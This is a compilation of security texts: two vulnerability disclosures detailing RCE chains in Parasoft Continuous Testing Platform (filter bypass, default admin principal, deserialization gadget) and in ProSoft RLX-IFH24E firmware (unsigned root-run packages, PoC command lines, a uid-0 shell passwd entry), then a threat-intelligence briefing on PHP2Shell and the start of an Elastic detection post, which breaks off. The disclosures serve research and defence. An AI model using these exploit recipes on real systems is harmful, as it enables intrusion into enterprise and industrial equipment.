Full Text: Title: Parasoft Continuous Testing Platform 10.7.5- JSP command execution Author: 0day Rubbish Research Team Contact: disclosure@0day-rubbish.com Type: remote Platform: Linux CVE: pending Description: Parasoft Continuous Testing Platform (CTP) from Parasoft (United States), a closed-source commercial continuous-testing product bundling environment management, service virtualisation and test-data management, distributes an em web application running on Tomcat 10.1.57 with the Jasper JSP engine and Java 17 inside the vendor's own container image, and contains three composing first-party defects that yield unauthenticated remote code execution in two HTTP requests: an unfiltered ObjectInputStream over an uploaded backup archive (CWE-502, primary), a licensing filter that decides whether to run at all by testing the raw un-normalised request URI (CWE-436, primary and co-equal, with CWE-863 as its authorisation consequence), and a remember-me authentication service that hands an anonymous request an authenticated administrator principal when no external security provider has been configured (CWE-287, enabling gate). Defect one, the licensing filter: EMLicenseFilter is 175 lines and reads request.getRequestURI() raw at line 165, testing it at line 166 against exemption clauses including endsWith("about"), endsWith("welcome"), endsWith("forgot"), endsWith("notlicensed"), contains("/resources/") and contains("/images/"), none anchored by a separator or segment boundary, with a further branch at lines 167 to 171 that reassigns the entire exemption set rather than accumulating into it when the request accepts JSON. That test has exactly one consumer in the class, shouldNotFilter() at line 47 calling isLicenseRequired() at line 48, so a matching URI suppresses the whole doFilterInternal() body rather than weakening one decision, taking with it the /tdm/api/v guard at line 99 and the unlicensed-instance redirect to /em/license at line 118. Because a servlet container strips semicolon-delimited path parameters from each segment before servlet mapping, filter and router disagree about the identity of one request, and a target of /em/database/restore;welcome is exempted by the filter while still being routed to the restore handler. Defect two, the sink: com.parasoft.ctp.core.database.backup.AbstractDatabaseBackup, a class of 518 lines and 19,851 bytes, wraps the uploaded database.ser zip member at line 111 with new ObjectInputStream(in), reads an int at line 112 and calls readObject() at line 117 casting the result to TableMetadata, nine lines above the getConnection() call at line 126, so the cast constrains nothing (the gadget executes during the call and the ClassCastException is thrown afterwards) and no database needs to exist, be reachable or accept the supplied parameters for the payload already to have run. The caller is the web-layer controller EMDatabaseController, 1359 lines, whose restore handler at lines 707 and 708 takes a StandardMultipartHttpServletRequest and hard-compares zip member names against the literals "version.txt" at line 725 and "database.ser" at line 733, a shape check that says nothing about content. The absence of a filter is a corpus-wide artefact measurement rather than an inference: ObjectInputStream appears in 68 files with 149 occurrences in the core tree and in 3 files in the web layer, readObject appears in 81 files, and ObjectInputFilter appears in 0 files, jdk.serialFilter in 0 files and serialFilter in 0 files, three zeros across a class name, a system property and its short alias against a positive control of 81 files containing readObject. Two sibling readObject() calls on the same class of untrusted stream sit at lines 323 and 435 of the same class, in a row-draining and a row-binding routine, read from source and not detonated, named so a fix covers the class rather than the call site. Defect three, the fail-open gate: EMRememberMeServices is 483 lines and, at line 140 to 142, returns null when an Authorization header is present, then at line 146 fetches PSTSecServiceClient.getInstance() and at line 148, when that client is null, returns createAuthenticationToken("admin", "admin", EmUserInfo.Role.ADMIN, request), which registers new SimpleGrantedAuthority("ROLE_ADMIN") inside a Spring Security User whose authenticated flag is true, so the resulting principal is a genuinely authenticated administrator rather than the container's anonymous principal and satisfies the authenticated() matcher that CTPSecurityWebConfig line 283 demands for /database. Neither hop is an unprotected route, /database being explicitly matched to authenticated() and the images allow-list being /images/welcome/* rather than a widened glob, so the accurate description is not that the endpoints are unauthenticated but that the product mints an administrative principal for an anonymous request. CsrfSecurityRequestMatcher is a 28-line class whose anchored exemption alternation at line 19 includes /database, so the state-changing POST needs no CSRF token. The write primitive is a HashSet forcing hashCode() on a TiedMapEntry wrapping a LazyMap whose factory is a ConstantTransformer holding attacker bytes and whose decorated map is an aspectjweaver SimpleCache$StoreableCachingMap with an absolute folder field, reaching writeToPath(folder + File.separator + key, bytes). That class was read at the bytecode level for four facts: folder is declared private final String, is not transient, and the class declares no readObject of its own, so it is populated by the inherited HashMap.readObject path through defaultReadObject and both writer routines read it with an explicit getfield that the compiler has not inlined; writeToPath is getfield folder, StringBuilder, separator, key, store, with no forced extension appended to the key, an assumption that had to be disproved at the bytecode level because it would have removed any execution surface, and the value passes a checkcast to a byte array so the content is any bytes at all; validation is absent in every form, with zero occurrences of File.getName(), Path.normalize(), getCanonicalPath(), startsWith(), a regular expression or a length truncation in that write path, keys carrying slashes or relative traversals both working, and an absolute destination reachable because concatenation with an empty folder yields a leading double separator that POSIX treats as a valid absolute path; and the gadget does not fire on deserialization alone, because HashMap.readObject reconstitutes entries through putVal, which is package-private, final and not overridden, so it bypasses the overridden put containing the write, which is why the TiedMapEntry to LazyMap to Map.put prefix is needed to force a virtual dispatch. The only content constraint anywhere is that the bytes must not equal the four-byte sentinel IDEM, and the published carrier sets storingTimer to Integer.MAX_VALUE to suppress the index file the caching map would otherwise write alongside the payload. The execution sink is the product's own container configuration: conf/web.xml declares the Jasper jsp servlet and its mapping at lines 274-275 and 448-450, and webapps/em/images/ is inside the deployed web application root the mapping covers, writable by uid 1000 as drwxrwxr-x parasoft root, and exempt from the licensing filter by the contains("/images/") clause at line 166, so fetching the written page needs no bypass of its own and the product compiles it into work/Catalina/localhost/em/org/apache/jsp/images/<stem>_jsp.java and .class. Full Text: Title: ProSoft RLX-IFH24E v2.2.44 - Unsigned Firmware Upgrade Package Executed as Root Author: 0day Rubbish Research Team Contact: disclosure@0day-rubbish.com Type: remote Platform: Hardware Advisory: https://0day-rubbish.com/blog/prosoft-rlx-ifh24e-unsigned-upgrade-package-root-rce CVE: pending Description: ProSoft RLX-IFH24E, version v2.2.44, the industrial wireless radio from ProSoft Technology, Inc. (United States) whose research designation is RLX-IH 24E, installs and executes code submitted over its management interface without performing any signature, hash or CRC check on it. The appliance is a closed-source embedded device and an OEM build of the MicroHard Systems IPx21 platform on the MHX-910 board design: an Intel IXP425 XScale processor, ARM big-endian, Linux 2.4.24-uc0, with static management pages under /usr/web and 57 ARM big-endian CGI programs under /usr/lib/cgi-bin/ served by boa over HTTP and boa_ssl over HTTPS. The classification is CWE-494, download of code without integrity check, with CWE-345 and CWE-347 co-equal, because the only authenticity check in the path is a non-cryptographic string equality and no signature is verified anywhere. CWE-434, CWE-73, CWE-250 and CWE-269 contribute. It is explicitly not CWE-78 and a command-injection remediation would not fix it: the shared platform helper SubProgram_Start at offset 0xbd5c splits its argument string on spaces with strtok into at most eight tokens and then calls vfork and execvp directly, so no shell is ever invoked and shell metacharacters are inert here. The upload hop is in usr/lib/cgi-bin/tool_reprogramming.cgi, routine HandleSubmit at offset 0x8d1c, with its formatting string at rodata offset 0x2b1c. On the file1 part of a multipart/form-data POST to /cgi-bin/tool_reprogramming.cgi it calls cgiFormFileName and cgiFormTempFileName, builds the move argument with sprintf(buf, "%s /upgrade/upgrade/%s", tempfile, origfilename), runs SubProgram_Start("/bin/mv", buf), which must succeed, and then runs SubProgram_Start("/sbin/upgrade", origfilename). The client-supplied original filename is therefore used unmodified twice, once as the destination of the move and once as the installer's only argument, which makes the file extension and so the installer branch entirely the requester's choice. The handler applies no extension whitelist, no digest comparison and no path canonicalisation. The install hop is /sbin/upgrade, a short POSIX shell script shipped in the same package, running with the CGI's own privileges, which are root. It dispatches on ${FILE##*.} and its three consequential branches are: ".pkg", which tests gzip stream integrity with gunzip -t, unpacks with tar -xf into a staging tree, compares the appliance's PRODUCT_NAME read from /etc/MHX_CONFIG against a LOCK_NAME read from a lockfile inside the package itself, prints "Match image." on equality, executes ./pre, applies the inner archive with tar -xf extract/upgradepkg.tar -C /, executes ./post, prints "Upgrade Successful" and then reboots unconditionally; ".passwd", which copies the upload over both /etc/passwd and /etc/passwd_original; and ".factory", which copies the upload over /etc/db1, the configuration store holding the management interface's own transport flags, accounts and radio behaviour. The equality test is the only gate before code execution and both of its operands are available to the requester: the expected value is the compile-time platform constant IPx21PROSOFT recoverable by reading the shipped firmware once, and the asserted value is carried inside the package being installed. A package whose identity is validated against data carried inside that same package cannot be a source of assurance about it. The defect is the absence of an authenticity step, not a weak one, and strengthening the compatibility check would change nothing while both operands come from the same side. Impact: root command execution on the appliance from a single multipart/form-data POST followed by the product's own documented install sequence, with requester-authored shell code running both before and after an unconstrained archive extraction into the root of the filesystem. Attacker code reading the pre-execution state, an arbitrary rootfs write through the inner archive whose entry names are constrained in no way, and attacker code running post-write are all present in one request. The .passwd branch reaches the same privilege ceiling without executing anything, replacing both the live account database and its backup copy so that the device's own recovery path restores the modified database rather than the shipped one; since the factory admin entry is uid 0 with the restricted shell /bin/txtUI, an added uid-0 entry with /bin/sh converts an administratively restricted login into a general root shell at the next interactive login. The .factory branch lets a requester rewrite the device's security configuration, widening or narrowing the exposure of the surface they arrived through and surviving a later reconfiguration by the operator. Persistence is native to the product rather than improvised, because the install rewrites the rootfs and the installer always reboots on success. Availability is controlled at will, both by that reboot and by installing content that stops the device serving traffic, which for a radio carrying traffic between a process network and its field instruments is also a position on the path that traffic takes. Detection is weak by construction: every step is documented product behaviour, the request is an ordinary firmware upload, the response is the vendor's own success page, and a legitimate upgrade prints exactly the same "Match image." and "Upgrade Successful", so the usable indicators are post-hoc and filesystem-level, namely an installed package whose LOCK_NAME and VERSION pair corresponds to no release the operator obtained, an unexpected file under /upgrade/upgrade/, and a uid-0 account whose shell is not the vendor's restricted interface. Verification boundary, stated exactly because it is narrower than the headline suggests, and because the classification above depends on it. The installer half of the chain was measured and the upload half was not. No HTTP request was ever issued at this product and no physical appliance was used at any point, so nothing here is an exploit run against a live device and it is not presented as one. What was executed is the firmware's own /sbin/upgrade, byte-for-byte unmodified, inside an isolated chroot sandbox built on a copy of the upgrade package's own root filesystem. A crafted .pkg printed "Match image." then "Upgrade Successful" and exited 0; the pre script left a marker proving it executed and wrote PRE-RAN-AS-UID=0 into a second marker, the post script left its own marker, and the inner archive applied an entry to the root of the filesystem. The uid marker is the load-bearing evidence: the payload wrote that value at runtime rather than having it read from a configuration file, so it is the executing identity and not an inference about it. The recorded landing identity is uid=0(root). A .passwd run replaced both /etc/passwd and /etc/passwd_original with the uploaded text, proven by a pre-run digest of the pre-seeded database that no longer matched afterwards and by a marker line present in both copies. A negative control was run to establish that none of this came from the harness: a structurally identical package, same outer tar layout, same metadata files, same inner archive, same marker-writing scripts, with exactly one deliberate difference, LOCK_NAME=WRONGPRODUCT, was refused with "This unit doesn't support the image." and produced no markers anywhere. That control also isolates the product-string comparison as the single cause of refusal and makes the positive and negative runs mutually exclusive. Four substitutions existed in the harness and none in the code under test: an x86 busybox build supplied /bin/sh, tar, gunzip, mv and cp because the firmware's own copies are ARM big-endian and the host is not; a stub replaced the platform mhx utility; /etc/MHX_CONFIG was populated with the product identity the firmware itself ships; and /etc/passwd was pre-seeded with three factory-style entries for comparison. Two transcript lines, "logger: not found" and "mhx: not found", are absent helpers in the sandbox PATH and are not product behaviour. The run count is one positive .pkg run, one positive .passwd run and one negative control, in one sandbox on one host, each effect observed once, never repeated across sandbox builds and never performed on hardware. Not measured, and not claimed: the web server and its access control, because /bin/boa lives in the device base flash and is not contained in the system upgrade package, so the access control gating this CGI could be neither proved nor disproved from the artefacts available; the CGI binaries and the firmware's ARM helpers, for the architecture reason; the closing reboot, since the sandbox is a directory tree with no init, though the path up to it was observed; any privilege escalation, the chain starting from the administrative identity the product's own account database already grants uid 0; any reach into the radio baseband image RLX-IFH24E_v5089.mhx, identified but not exercised; and any impact on an attached control system, PLC or historian. Consequently the Type field above reflects the documented delivery vector, a network POST to a CGI on the management listener, and the Platform field reflects a firmware and hardware target; the part that was actually executed was the vendor's own installer acting on a supplied file, and a reader should weight the two halves of this chain differently. That is what the published advisory is written to allow. CVSS: 7.2 High (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H) is the single score published for this finding, computed from first principles rather than inherited: ISS = 1 - (0.44 x 0.44 x 0.44) = 0.914816; Impact at Scope Unchanged = 6.42 x 0.914816 = 5.873119; Exploitability = 8.22 x 0.85 x 0.77 x 0.27 x 0.85 = 1.234708; Base = Roundup(7.107826) = 7.2. AV:N because the entry point is a network service and the firmware's own default configuration record inside the shipped package enables the web interface on both transports, UI_Access_HTTP=B and HTTPS=B, with non-default values for the Telnet and SSH entries; that shipped record is the evidence for a default, and the Network classification comes from the transport the artefact establishes rather than from a reach we observed. AC:L because the chain is deterministic, with no race, no timing window, no memory-layout dependency and no on-path position, and the single piece of environment knowledge it needs is a platform string published inside the shipped firmware. PR:H because installing firmware is an administrative function, the handler is a maintenance CGI linked directly from the interface's own menu pages, and the only account model the package documents for that interface is a uid-0 admin entry with a password-change page and a configurable RADIUS mode; no lower-privileged principal was demonstrated reaching the handler. UI:N because once a session holds that privilege the move, the install, both script executions and the reboot all follow from one request with no operator action and no confirmation step in the recovered handler path. Scope Unchanged because the vulnerable component and the impacted component are the same appliance operating system, the CGI already running as root, the installer already running as root and the rootfs extracted by that same root process, so no authority boundary is crossed. Three readings are published as rejected with their arithmetic: low privilege (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) computes to 8.8 and is available only by assuming that the shipped uid-500 upgrade account, whose home directory is the upload staging path and which shares the admin password hash, can reach the maintenance handler, which was not tested; Scope Changed (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H) computes to 9.1 and is rejected because an unproven boundary crossing may not raise a published score; high attack complexity (CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H) computes to 6.6 and is rejected because the control run isolates a wrong product string as the sole cause of refusal. Two of those rejected readings score higher than the number published, and the advisory says so itself. Two further readings are labelled conditionals and neither is the headline. An unauthenticated HTTP layer (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) would compute to 9.8 and was NOT demonstrated; it is a structural inference that applies only if the management listener does not gate the handler, and the binary that would answer that question is not in the package analysed. The supporting observation about the package is narrower and is weaker than that reading: none of the 57 shipped CGIs imports crypt, none parses or sets a session cookie and no login CGI exists in the directory, so the handler layer adds no authentication of its own, which says nothing about what the web server does before it forks a CGI. A factory credential still in place on a deployed unit would remove the need to discover any secret, but it was not demonstrated either, no authentication was performed against any appliance and no first-login behaviour was tested; under CVSS the metric prices the privilege level of the account used rather than whether its secret was public, so that reading leaves the vector unchanged at 7.2 and is published as a deployment amplifier for operators to assess. The factory password hash is deliberately not reproduced in this submission or in the advisory. No version-range claim is made: only the system upgrade package RLX-IFH24E_v2244.pkg was analysed, no other build of this model, no other version of the OEM IPx21 platform and no other product of either company is claimed as affected, although the upgrade path is a shared platform component rather than a per-product script, so a wider population of devices built on the same OEM platform plausibly shares the root cause, and that is stated as a likelihood rather than scored. Adjacent structural observations recorded in the analysis and deliberately excluded from this finding are a startup configuration that symlink-exposes /etc/MHX_CONFIG, /var/log/messages and /etc/system.debug into the web document root as configuration, syslog and debug views; a legacy debug CGI named request.cgi whose first-argument dispatch includes sending AT commands to the radio module, which was never executed and to which no AT command was sent; and SNMP community strings public and private shipped on the platform, which belong to the configuration plane. Public records were searched by product designation, by the RLX-IH name, by the OEM platform name and by the vendor name with no result describing this appliance and this root cause; the one record associated with the vendor's RadioLinx engineering-software line concerns a pseudo-random number generator in that software family, a different product and a different defect class, and records naming the platform manufacturer's own product families concern different platforms and different chains. Proof of concept, published unconditionally. The shipped script is Python 3 using only the standard library, with no third-party dependency and no hardcoded target: the target address, port, scheme, credentials, command, lock name, product name, uploaded filename, marker token and output path are all command-line arguments and default to inert values, the default target being loopback and the default payload command being true. It builds a gzip-compressed tar containing the file and lockfile metadata the installer reads, the pre and post scripts at mode 0755 and extract/upgradepkg.tar, and can either write that package to disk for inspection or carry it in a multipart/form-data POST under the part name file1. Its modes and the flags that matter: Build the package locally only, performing no network access at all: python3 prosoft_rlx_ifh24e_unsigned_upgrade_package_root_rce.py --build-only --out demonstration.pkg Refuse a filename that would break the hand-off. The tool rejects any name containing a space or a path separator before it builds anything, because SubProgram_Start splits its argument string on spaces before execvp, so an extra token would change what /bin/mv is asked to do: --filename "payload.pkg" accepted --filename "pay load.pkg" rejected by the tool itself Build the negative control, for an operator who owns the hardware to confirm that the success path really is gated by the product string and by nothing else: python3 prosoft_rlx_ifh24e_unsigned_upgrade_package_root_rce.py --control --build-only --out control.pkg Build the account-database variant as a local file, which is never sent unless --send is also given: python3 prosoft_rlx_ifh24e_unsigned_upgrade_package_root_rce.py --passwd-mode --passwd-entry "marker:*:0:0:INERT-DEMONSTRATION-ENTRY:/root:/bin/sh" Deliver the built package to a management listener the operator owns and is authorised in writing to test, over HTTP or HTTPS, with optional HTTP Basic credentials: python3 prosoft_rlx_ifh24e_unsigned_upgrade_package_root_rce.py --target <address> --port 80 --user <user> --password <pass> python3 prosoft_rlx_ifh24e_unsigned_upgrade_package_root_rce.py --target <address> --port 443 --https --user <user> --password <pass> The default payload is deliberately non-destructive: pre touches one marker file and writes the executing uid into a second, post touches a third, and the inner archive writes a single marker entry under the root of the filesystem. Nothing is deleted, encrypted or modified beyond those markers. The tool also prints the sha256 of what it built, so an operator can record the digest of a package before installing it, which is the one detection control that works after the fact. The script's own documentation carries a warning that applies to every reader of this submission: the network half of this chain was never exercised against an appliance, and running it against hardware you do not own or hold written authorisation to test will reboot and reimage that device, because a successful install rewrites the rootfs and the installer always reboots on success. PoC location in the public repository: product/prosoft-technology/rlx-ifh24e-v2244/unsigned-upgrade-package-root-rce/exploit/prosoft_rlx_ifh24e_unsigned_upgrade_package_root_rce.py Repository: https://github.com/Exploit-Garbage/0day-Rubbish Full analysis, including the sink and source inventories with offsets, the end-to-end data flow marked at the line between measurement and inference, the verification transcripts, the negative control, the authentication boundary and its limits, the detection notes, the remediation set and the derivation of every one of the six CVSS readings: https://0day-rubbish.com/blog/prosoft-rlx-ifh24e-unsigned-upgrade-package-root-rce ProSoft Technology, Inc. was notified unconditionally through the mailbox its own website publishes for reporting a potential vulnerability, under a Security Assurance heading on its Quality and Environment page, with a copy to the North America technical-support address published on its Regional Technical Support page. The research is already public, no permission was asked for, no embargo was requested, nothing is withheld pending a reply and nothing is asked in return. Title: PHP2Shell Exploitation: Two Critical PHP Flaws Explained
Context: Although these reports indicate early exploitation activity, publicly available evidence remains insufficient to establish the extent of successful compromise or characterize...
Full Text:
The Latest Update

Insikt Group has published a TTP Instance for PHP2Shell covering public proof-of-concept (PoC) exploits, observed exploit activity, and recommended mitigations. As of 7 PM UTC on October 21, 2026:

Patch status: PHP released fixed versions on October 21, 2026: PHP 8.2.35, 8.3.36, 8.4.27, and 8.5.12.

Exploitation status: While there are some reports of emerging exploitation attempts targeting PHP2Shell, the available reporting does not establish the full extent of successful exploitation or confirmed compromises (1, 2).

PoC status: Publicly available repositories claim to provide PHP2Shell proof-of-concept (PoC) exploits, although their effectiveness and relationship to the confirmed vulnerabilities vary. For example, security researcher J4ck3LSyN published two alleged PoCs but subsequently invalidated the cached-pointer UAF theory underlying their proposed exploitation sequences.

How It Started

On October 20, 2026, the PHP security team announced an out-of-band security release for October 21 at 14:00 UTC to fix two critical vulnerabilities, both rated 9.2 under CVSS v4.0. PHP initially withheld technical details and affected versions pending coordinated disclosure, warning that the release could be accelerated if vulnerability details leaked or exploitation emerged.

Ahead of the scheduled release, watchTowr reported reproducing CVE-2026-109618 and assessed that both vulnerabilities could enable remote code execution (RCE). Technical information subsequently leaked before coordinated disclosure, prompting heightened concern about potential exploitation. PHP shipped the fixes on October 21, alongside a PHP Foundation post about the release, which addressed the emergency release and improvements to PHP's security processes.

The “PHP2Shell” name comes from Wiz Research, which found the flaws with Calif and OpenAI and reported them to PHP in August. Wiz’s write-up covers the discovery and root cause in depth.

The Vulnerabilities

Both CVEs are memory-safety vulnerabilities involving PHP's handling of request memory during initialization, error handling, and cleanup. According to Wiz, out-of-memory (OOM) failures and stale internal state can expose freed or partially initialized memory, potentially enabling memory disclosure, memory corruption, and remote code execution (RCE).

CVE-2026-109618: An OOM-related vulnerability involving partially initialized request memory. Wiz identified a use-after-free (UAF) in the session upload-progress unserializer and a related flaw that can disclose PHP worker memory. Wiz demonstrated unauthenticated RCE against WordPress, Drupal, and Joomla.

CVE-2026-109619: A stale-state vulnerability involving PHP globals that retain references to freed request memory. Wiz identified a UAF involving fatal-error backtraces and a separate OPcache type-confusion flaw. Wiz demonstrated unauthenticated RCE against Drupal and WordPress.

The vulnerabilities affect PHP itself rather than a particular website application. Some exploitation paths involve PHP's session upload-progress functionality, which VirusTotal notes has existed since PHP 5.4.0 and is enabled by default. Because exploitation depends on the PHP runtime, server configuration, and reachable execution paths, even websites with secure application code may be vulnerable.

PHP identified the following affected and patched versions. Older, unsupported PHP branches are not covered by these release-specific fixes and should not be presumed unaffected.

Affected Versions

Patched Versions

8.2 releases before 8.2.35

8.2.35

8.3 releases before 8.3.36

8.3.36

8.4 releases before 8.4.27

8.4.27

8.5 releases before 8.5.12

8.5.12

Reports of Active Exploitation

Following the disclosure of the PHP2Shell vulnerabilities, multiple sources reported exploitation activity in the wild:

Patchstack received reports of multiple active exploitation incidents from hosting partners by 07:34 UTC on October 21, ahead of PHP's security release.

Cloudflare CTO Dane Knecht reported observing early attacks targeting the vulnerabilities. Cloudflare subsequently deployed web application firewall (WAF) protections against known exploit vectors.

Although these reports indicate early exploitation activity, publicly available evidence remains insufficient to establish the extent of successful compromise or characterize the techniques used in observed attacks.

Public Proof-of-Concept Exploits

Numerous public GitHub repositories have emerged around PHP2Shell, including projects advertising proof-of-concept (PoC) exploits, vulnerability-testing tools, and defensive resources. Several claim to target CVE-2026-109618 and CVE-2026-109619 through memory-corruption techniques intended to crash vulnerable servers or achieve remote code execution (RCE). However, some rely on invalidated exploitation theories, and the existence of publicly available code does not establish that it successfully exploits either vulnerability.

Insikt Group's TTP Instance examines two PoC scripts published by security researcher J4ck3LSyN:

poc0_109618.py: Originally intended to exploit CVE-2026-109618 through PHP's session upload-progress functionality, using a proposed memory-corruption technique to execute commands on a vulnerable server.

poc1_109619.py: Originally intended to exploit CVE-2026-109619 through a related technique involving successive chunks of an uploaded file, similarly attempting to achieve remote code execution.

J4ck3LSyN subsequently invalidated the cached-pointer vulnerability theory underlying these proposed exploitation techniques but separately reported reproducing another memory-safety issue without demonstrating RCE.

Other publicly available repositories advertise PHP2Shell exploits, vulnerability-testing scripts, and demonstration environments. Some continue to describe the invalidated cached-pointer technique, while others claim to use different exploitation methods. At the time of this publication, Insikt Group has not independently tested J4ck3LSyN’s PoCs or other publicly available PoCs for accuracy or effectiveness.

Scale and Exposure

Two independent internet scans show how much PHP is exposed, but they count differently. Modat counts PHP services that report a readable version and were seen in the 10 days before October 20. VirusTotal counts IP addresses as of October 21, including PHP servers it identifies through signals other than a version string, such as the application, session cookies, and framework headers.

Modat: 4,384,302 PHP services on 1,886,612 unique hosts. About 79% of services with a readable version run a branch PHP no longer supports, and PHP 7.4, end of life since 2022, accounts for 878,761 services, more than any supported branch.

VirusTotal: About 5.1 million IP addresses running PHP, of which only about 1.1 million disclose a version, so roughly four in five hide it. Among those that disclose their version, about 758,000 run an end-of-life branch from 5.4 to 8.1, compared with about 272,000 on a supported branch, and PHP 7.4 alone accounts for about 187,000.

Neither scan counts confirmed vulnerable hosts, but both point the same way: most exposed PHP runs on end-of-life branches that will not receive an official fix. Scans that rely on version strings miss most of the exposed surface, and running the latest release was no protection: VirusTotal counted about 85,000 IP addresses on the September 24 releases, the newest available before the fix.

Why This Matters

Millions of servers could be exposed: VirusTotal identified approximately 5.1 million IP addresses running PHP, highlighting the potentially widespread reach of these vulnerabilities.

Even secure PHP applications are at risk: The flaws can allow unauthenticated remote code execution in PHP itself, even when the application running on top of it has no vulnerabilities.

Secrets can leak without code execution: Wiz showed that the memory disclosure flaw can expose passwords, authentication tokens, API keys, and certificates from other requests.

The patch window collapsed: Details leaked hours before the release, and security researchers reported exploitation attempts before fixed versions were available (1, 2).

Many servers run outdated PHP versions: VirusTotal found that most PHP servers disclosing their versions were running end-of-life branches that no longer receive regular upstream security updates.

Compromise can spread past the web server: VirusTotal found about 394,000 PHP hosts that also expose Secure Shell (SSH), about 233,000 that expose MySQL, and about 68,000 that expose remote desktop protocol (RDP).

Logs may show little: Exploitation happens below the application layer, so application logs may record limited context.

Timeline of Events

The disclosure of the PHP2Shell vulnerabilities unfolded over several weeks, beginning with their discovery in August 2026 and culminating in an emergency security release on October 21, 2026. However, vulnerability details became publicly accessible ahead of the coordinated release, prompting defensive preparations and reports of exploitation activity before patches became available.

The following timeline outlines key developments associated with the discovery, coordinated disclosure, early exploitation reports, and Recorded Future's response.

August 19, 2026: Wiz Research discovers the first PHP vulnerability using AI-assisted research tools.

August 20, 2026: Wiz Research confirms unauthenticated remote code execution (RCE) against Drupal.

August 21, 2026: Wiz Research confirms unauthenticated RCE against WordPress.

August 24, 2026: Wiz Research privately reports the vulnerabilities to the PHP security team, initiating the coordinated disclosure process.

September 21, 2026: The PHP security team acknowledges the vulnerability reports and begins developing coordinated fixes.

October 20, 2026: PHP announces an emergency, out-of-band security release scheduled for October 21 to address two critical vulnerabilities.

October 20, 2026: Insikt Group publishes an initial intelligence note highlighting the upcoming PHP security updates.

October 20, 2026: Recorded Future develops Attack Surface Intelligence signatures to identify potential exposure to CVE-2026-109618 and CVE-2026-109619.

October 21, 2026, 02:29 UTC: An archive containing leaked vulnerability information was first submitted to VirusTotal.

October 21, 2026, 07:34 UTC: Patchstack reports receiving notifications of multiple active exploitation incidents from hosting partners, several hours before the scheduled security release.

October 21, 2026, 13:52 UTC: PHP releases security updates addressing both vulnerabilities, ahead of the previously announced 14:00 UTC release time.

October 21, 2026, 17:52 UTC: Insikt Group publishes a PHP2Shell tactics, techniques, and procedures (TTP) instance to support threat detection and analysis.

Notably, reports of exploitation activity emerged before the official security release, creating a brief period during which vulnerability information was circulating publicly while affected organizations lacked an official patch. As a result, PHP users may discover exploitation attempts that occurred prior to the official patch disclosure. Threat hunters should therefore extend their lookback period for exploitation attempts to before the vulnerability disclosures were published.

Recorded Future Independent Analysis

Recorded Future's Insikt Group analyzed the PHP2Shell vulnerabilities, publicly available proof-of-concept (PoC) exploits, reported exploitation activity, and defensive measures. The resulting TTP Instance provides defenders with technical context and actionable guidance to help assess exposure, prioritize remediation, and identify potential attacks.

Public PoCs: Multiple publicly available GitHub repositories claim to provide PHP2Shell proof-of-concept (PoC) exploits targeting CVE-2026-109618 and CVE-2026-109619. These PoCs focus on exploiting PHP memory-safety flaws to achieve remote code execution, though their effectiveness varies, and some rely on exploitation techniques that were subsequently invalidated.

Exploit activity: Security vendors have reported emerging exploitation attempts targeting PHP2Shell, although the extent of successful exploitation remains unclear, and confirmed indicators of compromise (IoCs) remain limited. Insikt Group’s TTP Instance includes potential warning signs that defenders can monitor, such as unusual web requests, PHP errors, and suspicious server activity.

What You Need to Do Now

Organizations operating PHP-based applications should prioritize patching vulnerable systems, assessing their exposure, and monitoring for potential exploitation. Given reports of exploitation activity ahead of the coordinated security release, organizations should also investigate whether affected systems may have been compromised before patches became available.

Insikt Group recommends the following measures to mitigate the risks associated with PHP2Shell:

Prioritize Patching and Remediation: Upgrade affected PHP deployments to the appropriate patched versions, prioritizing internet-facing applications and critical infrastructure. Organizations running unsupported PHP versions should migrate to supported releases or obtain vendor-maintained security fixes. Ensure that remediation includes PHP components embedded in third-party applications, containers, and managed services.

Identify Exposed Assets and Validate Remediation: Inventory PHP deployments across organizational environments and assess exposure based on internet accessibility, configuration, and business criticality. Recorded Future customers should leverage Attack Surface Intelligence to identify potentially vulnerable internet-facing assets and validate remediation efforts.

Implement Compensating Security Controls: Where immediate patching is not feasible, restrict external access to vulnerable systems and implement applicable WAF protections, request filtering, and PHP configuration hardening. Ensure that origin servers cannot be accessed directly to bypass perimeter defenses. These measures may reduce exposure to certain exploitation techniques, but should not be considered substitutes for patching.

Monitor for Exploitation and Investigate Potential Compromise: Review web server, application, and endpoint telemetry for anomalous HTTP requests, PHP process failures, unexpected command execution, and other indicators of malicious activity. Prioritize reviewing activity beginning October 20, 2026, and investigate potentially compromised systems. Where compromise is identified, initiate incident response procedures and rotate potentially exposed credentials.

Recorded Future customers can access the Insikt Group PHP2Shell TTP Instance, Validated Intelligence Event, and Vulnerability Intelligence Cards® for CVE-2026-109618 and CVE-2026-109619 in the Recorded Future Intelligence Operations Platform. Recorded Future will continue to monitor developments related to PHP2Shell and provide updated intelligence as additional information becomes available.

Title: php2shell: Assessing Elastic detection coverage relevant to CVE-2026-109618 and CVE-2026-109619
Context: A web server process spawning a shell or writing a payload is abnormal no matter which vulnerability opened the door, which is why we build detection on that behavior rather...
Full Text:
On October 20, 2026, details of two critical remote code execution vulnerabilities in PHP, CVE-2026-109618 and CVE-2026-109619, leaked online ahead of their coordinated disclosure and before any patch existed. The PHP security team responded with advance notice of an emergency security release, scheduled for October 21, 2026 at 14:00 UTC, and rated both flaws critical with a CVSS v4.0 score of 9.2. Researchers at watchTowr confirmed the vulnerabilities are real and said they reproduced CVE-2026-109618, while noting they have not observed in-the-wild exploitation. The nickname circulating among researchers is php2shell.

PHP runs behind a very large share of the web: WordPress, Drupal, Joomla, and Magento, shared hosting and control panels, and a long tail of vendor software that bundles a PHP runtime without advertising it. When a critical bug lands in PHP core rather than in one application on top of it, the number of places you have to inventory grows quickly.

The PHP security team and the reporting researchers have now published the technical root cause, a pair of memory-safety bugs in PHP core, but at the time of writing there is still no reliable public proof-of-concept to run end to end. That is an awkward position for a defender, because you cannot simply run the exploit and watch the rules fire. It is not, however, a blind spot. An RCE in a PHP web application ends in the same observable place: a PHP worker process doing something a PHP worker process should not do. That convergent behavior is what we detect, and it is what this post is about.

In this post, we will cover:

What the advisory confirmed about CVE-2026-109618 and CVE-2026-109619, and what it means for defenders.

Why php2shell will likely behave like generic PHP backend exploitation.

The convergent post-exploitation flow, and the Elastic rules that cover this behavior.

How to assess and prepare potential coverage before the PoC lands, and what to do right now.

